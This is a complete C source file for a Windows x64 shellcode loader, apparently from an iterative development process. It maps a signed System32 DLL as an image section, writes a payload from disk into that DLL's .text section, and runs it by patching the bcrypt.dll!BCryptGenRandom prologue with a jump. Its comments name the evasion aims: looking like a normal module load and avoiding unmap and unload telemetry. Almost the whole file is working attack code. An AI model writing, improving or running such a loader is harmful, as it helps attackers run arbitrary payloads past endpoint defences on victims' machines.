/*
 * x64 shellcode loader - Iteration 3 (reviewed/fixed)
 *
 * Technique: threadless_injection (patched export prologue of a mapped
 *            image section) composed with module_stomping_section_mapping
 *            (NtCreateSection(SEC_IMAGE) + NtMapViewOfSection of a signed
 *            System32 DLL; payload written into its .text).
 *
 * Fixes vs Iter 2:
 *   - NtCreateSection(SEC_IMAGE) receives a file handle opened with
 *     GENERIC_READ|GENERIC_EXECUTE and FILE_SHARE_READ.
 *   - Trigger is a patched export prologue (bcrypt.dll!BCryptGenRandom),
 *     invoked normally from main() -- NOT EnumSystemLocalesEx.
 *   - No WinExec anywhere in the loader.
 *
 * Review fixes (Iter 3 review pass):
 *   - Resolve System32 dynamically via GetSystemDirectoryA; load host DLL
 *     by bare name so the loader entry matches a normal module load.
 *   - Use FILE_SHARE_READ only (matches strategy spec).
 *   - Distinct temp DWORD for VirtualProtect restore calls.
 *   - Scoped loop variable for prologue restore.
 *   - Removed dead g_payload assignment.
 *
 * Build (MSVC x64):
 *   cl /nologo /O2 /GS- loader_threadless_injection_3.c
 *
 * Usage:
 *   loader_threadless_injection_3.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/* ------------------------------------------------------------------ */
/* Minimal NT API declarations                                         */
/* ------------------------------------------------------------------ */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* ------------------------------------------------------------------ */
/* One-shot guard.                                                     */
/* ------------------------------------------------------------------ */
static volatile LONG g_done = 0;

/* ------------------------------------------------------------------ */
/* Read the whole file into a heap buffer. Caller frees.               */
/* ------------------------------------------------------------------ */
static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;
    size_t got = 0;

    if (path == NULL || out_size == NULL) {
        return NULL;
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
        fflush(stderr);
        return NULL;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fclose(fp);
        return NULL;
    }
    sz = ftell(fp);
    if (sz <= 0) {
        fclose(fp);
        fprintf(stderr, "[-] empty or unreadable file\n");
        fflush(stderr);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        fclose(fp);
        return NULL;
    }

    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(fp);
        return NULL;
    }

    got = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);

    if (got != (size_t)sz) {
        fprintf(stderr, "[-] short read (%zu of %ld)\n", got, sz);
        fflush(stderr);
        free(buf);
        return NULL;
    }

    *out_size = (size_t)sz;
    return buf;
}

/* ------------------------------------------------------------------ */
/* Locate the executable section of an image-mapped view.              */
/* ------------------------------------------------------------------ */
static unsigned char *find_exec_section(unsigned char *base, SIZE_T *out_size)
{
    PIMAGE_DOS_HEADER      dos;
    PIMAGE_NT_HEADERS      nt;
    PIMAGE_SECTION_HEADER  sec;
    WORD                   i;

    if (base == NULL || out_size == NULL) {
        return NULL;
    }

    dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *out_size = (SIZE_T)sec[i].Misc.VirtualSize;
            if (*out_size == 0) {
                *out_size = (SIZE_T)sec[i].SizeOfRawData;
            }
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Absolute-jump trampoline: mov rax, imm64 ; jmp rax  (12 bytes)      */
/* ------------------------------------------------------------------ */
static void build_jmp_trampoline(unsigned char *dst, void *target)
{
    dst[0] = 0x48;
    dst[1] = 0xB8;
    *(ULONGLONG *)(dst + 2) = (ULONGLONG)(ULONG_PTR)target;
    dst[10] = 0xFF;
    dst[11] = 0xE0;
}

/* ------------------------------------------------------------------ */
/* Resolve "<System32>\<name>". Returns 0 on success.                  */
/* ------------------------------------------------------------------ */
static int system32_path(const char *name, char *out, size_t out_cch)
{
    char sysdir[MAX_PATH];
    UINT n;

    if (name == NULL || out == NULL || out_cch < 2) {
        return -1;
    }

    n = GetSystemDirectoryA(sysdir, (UINT)(sizeof(sysdir) / sizeof(sysdir[0])));
    if (n == 0 || n >= (UINT)(sizeof(sysdir) / sizeof(sysdir[0]))) {
        return -1;
    }

    if ((size_t)n + 1 + strlen(name) + 1 > out_cch) {
        return -1;
    }

    /* sysdir already ends without a backslash in most cases; ensure one. */
    if (n > 0 && sysdir[n - 1] == '\\') {
        sysdir[n - 1] = '\0';
    }

    _snprintf_s(out, out_cch, _TRUNCATE, "%s\\%s", sysdir, name);
    return 0;
}

/* ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    HMODULE        ntdll = NULL;
    pNtCreateSection    NtCreateSection    = NULL;
    pNtMapViewOfSection NtMapViewOfSection = NULL;
    pNtClose            NtClose            = NULL;

    HANDLE         hFile = INVALID_HANDLE_VALUE;
    HANDLE         hSection = NULL;
    PVOID          view = NULL;
    SIZE_T         viewSize = 0;
    NTSTATUS       st;

    unsigned char *exec = NULL;
    SIZE_T         exec_size = 0;
    DWORD          old_prot = 0;
    SIZE_T         i;

    HMODULE        host = NULL;
    unsigned char *target_fn = NULL;
    unsigned char  saved_prologue[12];
    BOOL           prologue_saved = FALSE;

    char           host_path[MAX_PATH];
    const char    *host_dll_name = "bcrypt.dll";
    const char    *host_export   = "BCryptGenRandom";

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        fflush(stderr);
        return 1;
    }

    /* ---- 1. Load payload bytes from disk ---- */
    sc = read_file(argv[1], &sc_size);
    if (sc == NULL) {
        return 1;
    }
    printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);
    fflush(stdout);

    /* ---- 2. Resolve NT APIs from ntdll ---- */
    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed: %lu\n", GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    NtCreateSection    = (pNtCreateSection)   GetProcAddress(ntdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    NtClose            = (pNtClose)           GetProcAddress(ntdll, "NtClose");

    if (NtCreateSection == NULL || NtMapViewOfSection == NULL || NtClose == NULL) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 3. Build System32 path for the sacrificial DLL ---- */
    if (system32_path(host_dll_name, host_path, sizeof(host_path)) != 0) {
        fprintf(stderr, "[-] failed to build System32 path for %s\n", host_dll_name);
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 4. Open the sacrificial DLL (READ|EXECUTE required for SEC_IMAGE) ---- */
    hFile = CreateFileA(
        host_path,
        GENERIC_READ | GENERIC_EXECUTE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileA(%s) failed: %lu\n", host_path, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 5. Create an image section from the DLL ---- */
    st = NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL,                       /* ObjectAttributes */
        NULL,                       /* MaximumSize */
        PAGE_EXECUTE_READ,          /* SectionPageProtection (ignored for SEC_IMAGE) */
        SEC_IMAGE,                  /* AllocationAttributes */
        hFile);

    if (!NT_SUCCESS(st) || hSection == NULL) {
        fprintf(stderr, "[-] NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n",
                (unsigned long)st);
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 6. Map a view of the image section into our process ---- */
    viewSize = 0;
    st = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &view,
        0,                          /* ZeroBits */
        0,                          /* CommitSize */
        NULL,                       /* SectionOffset */
        &viewSize,
        ViewShare,
        0,
        PAGE_EXECUTE_READ);         /* Win32Protect */

    if (!NT_SUCCESS(st) || view == NULL) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] mapped image view at %p (size %zu) from %s\n",
           view, (size_t)viewSize, host_path);
    fflush(stdout);

    /* ---- 7. Locate the executable section ---- */
    exec = find_exec_section((unsigned char *)view, &exec_size);
    if (exec == NULL || exec_size == 0) {
        fprintf(stderr, "[-] no executable section found in mapped image\n");
        fflush(stderr);
        goto cleanup;
    }

    if (sc_size > exec_size) {
        fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                sc_size, (size_t)exec_size);
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] .text at %p (size %zu)\n", exec, (size_t)exec_size);
    fflush(stdout);

    /* ---- 8. Make the .text region writable, copy payload in ---- */
    if (!VirtualProtect(exec, exec_size, PAGE_READWRITE, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RW on .text) failed: %lu\n",
                GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    for (i = 0; i < sc_size; ++i) {
        exec[i] = sc[i];
    }

    SecureZeroMemory(sc, sc_size);

    /* ---- 9. Restore .text to PAGE_EXECUTE_READ (image-backed RX) ---- */
    if (!VirtualProtect(exec, exec_size, PAGE_EXECUTE_READ, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RX on .text) failed: %lu\n",
                GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] payload written into image-backed .text at %p\n", exec);
    fflush(stdout);

    /* ---- 10. Load the host module by bare name (normal loader entry) ---- */
    host = LoadLibraryA(host_dll_name);
    if (host == NULL) {
        fprintf(stderr, "[-] LoadLibraryA(%s) failed: %lu\n",
                host_dll_name, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    target_fn = (unsigned char *)GetProcAddress(host, host_export);
    if (target_fn == NULL) {
        fprintf(stderr, "[-] GetProcAddress(%s!%s) failed: %lu\n",
                host_dll_name, host_export, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] target export %s!%s at %p\n", host_dll_name, host_export, target_fn);
    fflush(stdout);

    /* ---- 11. Patch the export prologue with an absolute jmp ---- */
    if (!VirtualProtect(target_fn, 12, PAGE_EXECUTE_READWRITE, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RWX on export) failed: %lu\n",
                GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    for (i = 0; i < 12; ++i) {
        saved_prologue[i] = target_fn[i];
    }
    prologue_saved = TRUE;

    build_jmp_trampoline(target_fn, (void *)exec);

    {
        DWORD tmp_prot = 0;
        if (!VirtualProtect(target_fn, 12, old_prot, &tmp_prot)) {
            fprintf(stderr, "[-] VirtualProtect(restore on export) failed: %lu\n",
                    GetLastError());
            fflush(stderr);
            goto cleanup;
        }
    }

    printf("[+] patched %s!%s prologue -> jmp payload\n",
           host_dll_name, host_export);
    fflush(stdout);

    /* ---- 12. Trigger: call the patched export normally ---- */
    printf("[+] dispatching payload via patched %s!%s (threadless)\n",
           host_dll_name, host_export);
    fflush(stdout);

    {
        typedef NTSTATUS (WINAPI *BCryptGenRandom_t)(PVOID, PUCHAR, ULONG, ULONG);
        BCryptGenRandom_t call_export = (BCryptGenRandom_t)target_fn;

        if (InterlockedCompareExchange(&g_done, 1, 0) == 0) {
            /* Trampoline in the export prologue jumps to the payload. */
            call_export(NULL, NULL, 0, 0);
        }
    }

    printf("[+] payload returned; cleaning up\n");
    fflush(stdout);

cleanup:
    /* Restore the patched prologue before unloading. */
    if (prologue_saved && target_fn != NULL) {
        DWORD tmp = 0;
        if (VirtualProtect(target_fn, 12, PAGE_EXECUTE_READWRITE, &tmp)) {
            SIZE_T j;
            for (j = 0; j < 12; ++j) {
                target_fn[j] = saved_prologue[j];
            }
            VirtualProtect(target_fn, 12, tmp, &tmp);
        }
    }

    if (sc != NULL) {
        SecureZeroMemory(sc, sc_size);
        free(sc);
        sc = NULL;
    }
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
    }
    if (hSection != NULL) {
        NtClose(hSection);
        hSection = NULL;
    }
    /*
     * Deliberately do NOT unmap the view and do NOT FreeLibrary(host):
     * the stomped image and the loaded bcrypt.dll remain mapped in our
     * process, matching the appearance of a normally loaded module and
     * avoiding any unmap/unload telemetry.
     */
    return 0;
}